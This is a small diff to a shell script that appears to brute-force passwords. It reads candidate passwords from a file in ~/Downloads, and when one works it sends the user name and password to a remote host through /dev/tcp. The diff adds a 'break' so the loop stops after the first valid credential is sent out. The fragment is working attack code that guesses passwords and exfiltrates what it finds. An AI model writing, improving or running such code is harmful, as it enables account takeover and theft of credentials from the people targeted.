@@ -22,6 +22,7 @@ else
 		then
 			# Send "valid password" message to server
 			echo "$USER:$pwd:valid" > /dev/tcp/"$TARGET"/"$PORT"
+			break
 		fi
 	done < ~/Downloads/p
 fi
